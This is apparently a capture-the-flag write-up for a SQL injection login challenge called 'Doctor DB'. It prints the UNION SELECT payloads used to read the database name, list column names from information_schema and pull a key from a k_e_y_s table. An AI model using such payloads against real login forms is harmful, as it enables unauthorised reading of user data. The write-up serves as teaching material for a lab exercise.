>Doctor DB (200)

This was a basic SQLi challenge. It was a login challenge, where the flag was
hidden in the username field of another user, if I remember correctly.

Since I can't access the level once I've solved it, here are some of the
queries I used to solve it. (I didn't have sqlmap available so had to
do it by trial and error).

`doctor' UNION SELECT 1,(SELECT database()),3 #`

This makes the login query something like:
```sql
SELECT * FROM users WHERE username='doctor' UNION SELECT 1,(SELECT database()),3 # AND password=''
```

There were 3 columns in the user table, with the middle column (username) being displayed.

Getting the column names:

`doctor' UNION SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT 0,1),3 #`

###Winning Query:

`doctor' UNION SELECT 1,(SELECT user_key from k_e_y_s LIMIT 9,1),3 #`

I'm habitual of creating a simple html page to exploit SQLi levels. The one 
I used for cracking this is level is atached as `index.html`.